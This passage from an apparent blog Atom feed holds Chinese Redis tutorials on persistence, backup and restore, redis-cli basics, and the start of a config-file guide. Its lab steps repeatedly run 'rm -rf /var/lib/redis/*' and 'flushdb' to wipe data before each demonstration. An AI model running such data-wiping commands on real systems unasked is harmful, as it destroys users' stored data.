EE4;&#x4E00;&#x6837;&#x7684;&#x64CD;&#x4F5C;&#x3002;</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Redis&amp;#x6301;&amp;#x4E45;&amp;#x5316;&quot;&gt;&lt;a href=&quot;#Redis&amp;#x6301;&amp;#x4E45;&amp;#x5316;&quot; class=&quot;headerlink&quot; title=&quot;Redis&amp;#x6301;&amp;#x4E45;&amp;#x5316;&quot;&gt;&lt;/a
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Redis的数据备份与恢复</title>
    <link href="https://marnm.github.io//posts/e3fb0a3e/"/>
    <id>https://marnm.github.io//posts/e3fb0a3e/</id>
    <published>2022-06-07T04:49:33.000Z</published>
    <updated>2022-06-07T05:06:48.225Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Redis&#x7684;&#x6570;&#x636E;&#x5907;&#x4EFD;&#x4E0E;&#x6062;&#x590D;"><a href="#Redis&#x7684;&#x6570;&#x636E;&#x5907;&#x4EFD;&#x4E0E;&#x6062;&#x590D;" class="headerlink" title="Redis&#x7684;&#x6570;&#x636E;&#x5907;&#x4EFD;&#x4E0E;&#x6062;&#x590D;"></a>Redis&#x7684;&#x6570;&#x636E;&#x5907;&#x4EFD;&#x4E0E;&#x6062;&#x590D;</h1><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><ol><li>&#x542F;&#x52A8;Redis</li></ol><p>&#x8FDB;&#x5165;Redis&#x76EE;&#x5F55;</p><pre><code>redis-cli</code></pre><ol start="2"><li><p>&#x6570;&#x636E;&#x5907;&#x4EFD;</p><p> SAVE</p></li></ol><p>&#x8BE5;&#x547D;&#x4EE4;&#x5C06;&#x5728;redis&#x5907;&#x4EFD;&#x76EE;&#x5F55;&#x4E2D;&#x521B;&#x5EFA;dump.rdb&#x6587;&#x4EF6;&#x3002;</p><ol start="3"><li><p>&#x6062;&#x590D;&#x6570;&#x636E;</p><pre><code>config get dir</code></pre></li></ol><p>&#x4EE5;&#x4E0A;&#x547D;&#x4EE4;config get dir&#x8F93;&#x51FA;&#x7684;redis&#x5907;&#x4EFD;&#x76EE;&#x5F55;&#x4E3A;/usr/local/redis/bin</p><p>&#x505C;&#x6B62;Redis&#x670D;&#x52A1;</p><p>&#x62F7;&#x8D1D;&#x5907;&#x4EFD;&#x6587;&#x4EF6;&#x5230;/usr/local/redis/bin&#x76EE;&#x5F55;&#x4E0B;</p><p>&#x91CD;&#x542F;redis</p><h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><pre><code>redis-server --service-install redis.windows.confredis-server --service-startredis-server --service-stop</code></pre><h2 id="&#x5B9E;&#x6218;&#x7814;&#x7A76;"><a href="#&#x5B9E;&#x6218;&#x7814;&#x7A76;" class="headerlink" title="&#x5B9E;&#x6218;&#x7814;&#x7A76;"></a>&#x5B9E;&#x6218;&#x7814;&#x7A76;</h2><h3 id="SAVE"><a href="#SAVE" class="headerlink" title="SAVE"></a>SAVE</h3><pre><code>rm -rf /var/lib/redis/*redis-cliflushdbset jaking 666get jakingsavequitls /var/lib/redis/redis-cliget jakingdel jakingget jakingquitls /var/lib/redis/systemctl restart redisredis-cliget jaking</code></pre><h3 id="BGSAVE"><a href="#BGSAVE" class="headerlink" title="BGSAVE"></a>BGSAVE</h3><pre><code>rm -rf /var/lib/redis/*redis-cliflushdbset jaking 666get jakingbgsavequitls /var/lib/redis/redis-cliget jakingdel jakingget jakingquitls /var/lib/redis/systemctl restart redisredis-cliget jaking</code></pre><h3 id="BGREWRITEAOF"><a href="#BGREWRITEAOF" class="headerlink" title="BGREWRITEAOF"></a>BGREWRITEAOF</h3><pre><code>rm -rf /var/lib/redis/*redis-cliset jaking 666bgrewirteaofquitls /var/lib/redis/sz /var/lib/redis/appendonly.aofredis-cliget jakingdel jakingget jakingquitsystemctl restart redisredis-cliget jakingquit</code></pre><p><strong>&#x601D;&#x8003;&#xFF1A;&#x4E3A;&#x4EC0;&#x4E48;&#x4E0D;&#x80FD;&#x6062;&#x590D;&#x6570;&#x636E;&#xFF1F;</strong></p><p>rdb&#x662F;&#x5FEB;&#x7167;&#xFF0C;&#x5B9A;&#x671F;&#x628A;redis&#x5185;&#x5B58;&#x6570;&#x636E;&#x5237;&#x5230;dump.rdb</p><p>aof&#x662F;&#x8BB0;&#x5F55;&#x547D;&#x4EE4;</p><p>&#x4E3B;&#x52A8;&#x5220;&#x9664;&#xFF0C;&#x4E0D;&#x80FD;&#x6062;&#x590D;&#xFF01;&#x9664;&#x975E;&#x662F;redis&#x5F02;&#x5E38;&#x3001;&#x91CD;&#x88C5;&#x3001;&#x8FC1;&#x79FB;&#x624D;&#x80FD;&#x6062;&#x590D;&#xFF01;</p><h3 id="RDB"><a href="#RDB" class="headerlink" title="RDB"></a>RDB</h3><p><strong>&#x8FC1;&#x79FB;&#x6570;&#x636E;</strong></p><pre><code>rpm -ivh redis-5.0.11-1.el7.remi.x86_64.rpm systemctl start redisrm -rf /var/lib/redis/*cd /var/lib/redisrzredis-cliget jaking</code></pre><p><strong>AOF</strong></p><pre><code>redis-cliset abc 123get abcbgrewriteaofquitlssz appendonly.aof</code></pre><p><strong>&#x8FC1;&#x79FB;&#x6570;&#x636E;</strong></p><pre><code>cat /etc/redis.confchown redis.redis appendonly.aof</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Redis&amp;#x7684;&amp;#x6570;&amp;#x636E;&amp;#x5907;&amp;#x4EFD;&amp;#x4E0E;&amp;#x6062;&amp;#x590D;&quot;&gt;&lt;a href=&quot;#Redis&amp;#x7684;&amp;#x6570;&amp;#x636E;&amp;#x5907;&amp;#x4EFD;&amp;#x4E0
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Redis基本操作</title>
    <link href="https://marnm.github.io//posts/49fbbc1/"/>
    <id>https://marnm.github.io//posts/49fbbc1/</id>
    <published>2022-06-07T04:49:20.000Z</published>
    <updated>2022-06-07T05:06:31.070Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Redis&#x57FA;&#x672C;&#x64CD;&#x4F5C;"><a href="#Redis&#x57FA;&#x672C;&#x64CD;&#x4F5C;" class="headerlink" title="Redis&#x57FA;&#x672C;&#x64CD;&#x4F5C;"></a>Redis&#x57FA;&#x672C;&#x64CD;&#x4F5C;</h1><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[root@ctos7mini ~]&amp; redis-cli -h</span><br><span class="line">redis-cli 3.2.5</span><br><span class="line"></span><br><span class="line">Usage: redis-cli [OPTIONS] [cmd [arg [arg ...]]]</span><br><span class="line">  -h &lt;hostname&gt;      &#x6307;&#x5B9A;&#x4E3B;&#x673A;IP (default: 127.0.0.1).</span><br><span class="line">  -p &lt;port&gt;          &#x6307;&#x5B9A;&#x7AEF;&#x53E3;socket&#x6587;&#x4EF6;&#x8FDB;&#x884C;&#x901A;&#x4FE1; (default: 6379).</span><br><span class="line">  -s &lt;socket&gt;        &#x6307;&#x5B9A;socket&#x6587;&#x4EF6;&#xFF0C;&#x5982;&#x679C;&#x5BA2;&#x6237;&#x7AEF;&#x548C;&#x670D;&#x52A1;&#x7AEF;&#x90FD;&#x5728;&#x540C;&#x4E00;&#x53F0;&#x4E3B;&#x673A;&#xFF0C;&#x53EF;&#x4EE5;&#x6307;&#x5B9A;socket&#x6587;&#x4EF6;&#x8FDB;&#x884C;&#x901A;&#x4FE1;</span><br><span class="line">  -a &lt;password&gt;      &#x6307;&#x5B9A;&#x8BA4;&#x8BC1;&#x5BC6;&#x7801;.</span><br><span class="line">  -r &lt;repeat&gt;        &#x8FDE;&#x63A5;&#x6210;&#x529F;&#x540E;&#x6307;&#x5B9A;&#x8FD0;&#x884C;&#x7684;&#x547D;&#x4EE4;N&#x6B21;.</span><br><span class="line">  -i &lt;interval&gt;      &#x8FDE;&#x63A5;&#x6210;&#x529F;&#x540E;&#x6BCF;&#x4E2A;&#x547D;&#x4EE4;&#x6267;&#x884C;&#x5B8C;&#x6210;&#x7B49;&#x5F85;&#x65F6;&#x95F4;&#xFF0C;&#x4F7F;&#x7528;-i&#x9009;&#x9879;&#x6307;&#x5B9A;.</span><br><span class="line">                     </span><br><span class="line">  -n &lt;db&gt;            Database number.</span><br><span class="line">.......................&#x7701;&#x7565;...........................................</span><br><span class="line"></span><br><span class="line">[root@ctos7mini ~]&amp;</span><br></pre></td></tr></tbody></table></figure><h2 id="&#x767B;&#x5F55;Redis"><a href="#&#x767B;&#x5F55;Redis" class="headerlink" title="&#x767B;&#x5F55;Redis"></a>&#x767B;&#x5F55;Redis</h2><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@ctos7mini ~]&amp; redis-cli</span><br><span class="line">127.0.0.1:6379&gt; exit</span><br><span class="line">[root@ctos7mini ~]&amp;</span><br><span class="line"></span><br><span class="line">&#x6216;&#x8005;</span><br><span class="line">[root@ctos7mini ~]&amp; redis-cli -h 127.0.0.1</span><br><span class="line">127.0.0.1:6379&gt;</span><br></pre></td></tr></tbody></table></figure><h2 id="&#x83B7;&#x53D6;Redis&#x5E2E;&#x52A9;"><a href="#&#x83B7;&#x53D6;Redis&#x5E2E;&#x52A9;" class="headerlink" title="&#x83B7;&#x53D6;Redis&#x5E2E;&#x52A9;"></a>&#x83B7;&#x53D6;Redis&#x5E2E;&#x52A9;</h2><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; help</span><br><span class="line">redis-cli 3.2.5</span><br><span class="line">To get help about Redis commands type:</span><br><span class="line">      &quot;help @&lt;group&gt;&quot; to get a list of commands in &lt;group&gt;</span><br><span class="line">      &quot;help &lt;command&gt;&quot; for help on &lt;command&gt;</span><br><span class="line">      &quot;help &lt;tab&gt;&quot; to get a list of possible help topics</span><br><span class="line">      &quot;quit&quot; to exit</span><br><span class="line"></span><br><span class="line">To set redis-cli perferences:</span><br><span class="line">      &quot;:set hints&quot; enable online hints</span><br><span class="line">      &quot;:set nohints&quot; disable online hints</span><br><span class="line">Set your preferences in ~/.redisclirc</span><br><span class="line">127.0.0.1:6379&gt;</span><br><span class="line"></span><br><span class="line">&#x6216;&#x8005;,&#x83B7;&#x53D6;&#x6307;&#x5B9A;&#x6570;&#x636E;&#x7ED3;&#x6784;&#x7684;&#x5E2E;&#x52A9;</span><br><span class="line">127.0.0.1:6379&gt; help @string</span><br><span class="line"></span><br><span class="line">  APPEND key value</span><br><span class="line">  summary: Append a value to a key</span><br><span class="line">  since: 2.0.0</span><br><span class="line"></span><br><span class="line">  BITCOUNT key [start end]</span><br><span class="line">  summary: Count set bits in a string</span><br><span class="line">  since: 2.6.0</span><br><span class="line"></span><br><span class="line">  BITFIELD key [GET type offset] [SET type offset value] [INCRBY type offset increment] [OVERFLOW WRAP|SAT|FAIL]</span><br><span class="line">  summary: Perform arbitrary bitfield integer operations on strings</span><br><span class="line">  since: 3.2.0</span><br><span class="line"></span><br><span class="line">  BITOP operation destkey key [key ...]</span><br><span class="line">  summary: Perform bitwise operations between strings</span><br><span class="line">  since: 2.6.0</span><br><span class="line"> .......................................................&#x7701;&#x7565;...............................................................</span><br></pre></td></tr></tbody></table></figure><p><strong>&#x83B7;&#x53D6;&#x5355;&#x4E2A;&#x547D;&#x4EE4;&#x7684;&#x4F7F;&#x7528;&#x65B9;&#x6CD5;</strong><br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; help APPEND</span><br><span class="line"></span><br><span class="line">  APPEND key value                         //&#x547D;&#x4EE4;&#x65B9;&#x6CD5;</span><br><span class="line">  summary: Append a value to a key</span><br><span class="line">  since: 2.0.0                             //&#x8BF4;&#x660E;&#x6B64;&#x547D;&#x4EE4;&#x5728;&#x54EA;&#x4E2A;&#x7248;&#x672C;&#x4E2D;&#x5F15;&#x5165;&#x7684; </span><br><span class="line">  group: string                            //&#x8BE5;&#x547D;&#x4EE4;&#x6240;&#x5C5E;&#x54EA;&#x4E00;&#x4E2A;&#x7EC4;</span><br><span class="line"></span><br><span class="line">127.0.0.1:6379&gt;</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5E26;<code>@</code>&#x7684;&#x4E3A;&#x7EC4;&#xFF0C;&#x4E0D;&#x5E26;&#x5219;&#x4E3A;&#x547D;&#x4EE4;</p><p><strong>&#x5207;&#x6362;&#x5E93;&#xFF08;&#x540D;&#x79F0;&#x7A7A;&#x95F4;&#xFF09;&#xFF1A;</strong><br></p><figure class="highlight"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; select 1 --&#x8868;&#x793A;&#x5207;&#x6362;&#x5230;1&#x53F7;&#x5E93;&#x4E2D;&#xFF0C;&#x9ED8;&#x8BA4;&#x4E3A;0&#x53F7;&#x5E93;&#xFF0C;&#x5171;16&#x4E2A;&#xFF0C;0-15</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379[1]&gt;</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>set</strong><br></p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; help set</span><br><span class="line"></span><br><span class="line">  <span class="keyword">SET</span> <span class="keyword">key</span> <span class="keyword">value</span> [EX seconds] [PX milliseconds] [NX|XX] <span class="comment">-- &#x547D;&#x4EE4; &#x952E; &#x503C; [EX&#x8FC7;&#x671F;&#x65F6;&#x95F4;&#xFF0C;&#x5355;&#x4F4D;&#x79D2;s]</span></span><br><span class="line">  summary: <span class="keyword">Set</span> the <span class="keyword">string</span> <span class="keyword">value</span> <span class="keyword">of</span> a <span class="keyword">key</span></span><br><span class="line">  since: <span class="number">1.0</span><span class="number">.0</span></span><br><span class="line">  <span class="keyword">group</span>: <span class="keyword">string</span></span><br><span class="line"></span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span>&gt;</span><br><span class="line"><span class="comment">-- NX &#x5982;&#x679C;&#x4E00;&#x4E2A;&#x952E;&#x4E0D;&#x5B58;&#x5728;&#xFF0C;&#x624D;&#x521B;&#x5EFA;&#x5E76;&#x8BBE;&#x5B9A;&#x503C;&#xFF0C;&#x5426;&#x5219;&#x4E0D;&#x5141;&#x8BB8;&#x8BBE;&#x5B9A;</span></span><br><span class="line"><span class="comment">-- XX &#x5982;&#x679C;&#x4E00;&#x4E2A;&#x952E;&#x5B58;&#x5728;&#x5219;&#x8BBE;&#x7F6E;&#x952E;&#x7684;&#x503C;&#xFF0C;&#x5982;&#x679C;&#x4E0D;&#x5B58;&#x5728;&#x5219;&#x4E0D;&#x521B;&#x5EFA;&#x5E76;&#x4E0D;&#x8BBE;&#x7F6E;&#x5176;&#x503C;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">-- &#x5B9A;&#x4E49;&#x4E00;&#x4E2A;&#x952E;&#x5E76;&#x8BBE;&#x7F6E;&#x8FC7;&#x671F;&#x65F6;&#x95F4;&#x4E3A;10&#x79D2;</span></span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span>&gt; <span class="keyword">set</span> value_1 <span class="number">404</span> EX <span class="number">10</span></span><br><span class="line">OK</span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span>&gt; <span class="keyword">get</span> value_1</span><br><span class="line"><span class="string">&quot;404&quot;</span></span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span>&gt; <span class="keyword">get</span> value_1</span><br><span class="line"><span class="string">&quot;404&quot;</span></span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span>&gt; <span class="keyword">get</span> value_1</span><br><span class="line"><span class="string">&quot;404&quot;</span></span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span>&gt; <span class="keyword">get</span> value_1</span><br><span class="line"><span class="string">&quot;404&quot;</span></span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span>&gt; <span class="keyword">get</span> value_1</span><br><span class="line"><span class="string">&quot;404&quot;</span></span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span>&gt; <span class="keyword">get</span> value_1</span><br><span class="line">(nil)</span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span>&gt;</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>&#x83B7;&#x53D6;&#x952E;&#x4E2D;&#x7684;&#x503C;</strong><br></p><figure class="highlight"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; help get</span><br><span class="line"></span><br><span class="line">  GET key</span><br><span class="line">  summary: Get the value of a key</span><br><span class="line">  since: 1.0.0</span><br><span class="line">  group: string</span><br><span class="line"></span><br><span class="line">127.0.0.1:6379&gt;</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>&#x6DFB;&#x52A0;&#x952E;&#x4E2D;&#x7684;&#x503C;</strong><br></p><figure class="highlight"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; help append</span><br><span class="line"></span><br><span class="line">  APPEND key value</span><br><span class="line">  summary: Append a value to a key</span><br><span class="line">  since: 2.0.0</span><br><span class="line">  group: string</span><br><span class="line"></span><br><span class="line">127.0.0.1:6379&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">127.0.0.1:6379&gt; append value_1 502</span><br><span class="line">(integer) 3</span><br><span class="line">127.0.0.1:6379&gt; get value_1</span><br><span class="line">&quot;502&quot;</span><br><span class="line">127.0.0.1:6379&gt;</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>&#x83B7;&#x53D6;&#x503C;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x957F;&#x5EA6;</strong><br></p><figure class="highlight"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; help strlen</span><br><span class="line"></span><br><span class="line">  STRLEN key</span><br><span class="line">  summary: Get the length of the value stored in a key</span><br><span class="line">  since: 2.2.0</span><br><span class="line">  group: string</span><br><span class="line"></span><br><span class="line">127.0.0.1:6379&gt;</span><br><span class="line"></span><br><span class="line">127.0.0.1:6379&gt; strlen value_1</span><br><span class="line">(integer) 3</span><br><span class="line">127.0.0.1:6379&gt;</span><br></pre></td></tr></tbody></table></figure><p></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Redis&amp;#x57FA;&amp;#x672C;&amp;#x64CD;&amp;#x4F5C;&quot;&gt;&lt;a href=&quot;#Redis&amp;#x57FA;&amp;#x672C;&amp;#x64CD;&amp;#x4F5C;&quot; class=&quot;headerlink&quot; title=&quot;Redis&amp;#x57FA;&amp;#x67
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Redis配置文件详解</title>
    <link href="https://marnm.github.io//posts/f03da4e7/"/>
    <id>https://marnm.github.io//posts/f03da4e7/</id>
    <published>2022-06-07T04:49:09.000Z</published>
    <updated>2022-06-07T05:06:18.002Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Redis&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x8BE6;&#x89E3;"><a href="#Redis&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x8BE6;&#x89E3;" class="headerlink" title="Redis&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x8BE6;&#x89E3;"></a>Redis&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x8BE6;&#x89E3;</h1><p><code>/etc/redis.conf</code></p><figure class="highlight"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span 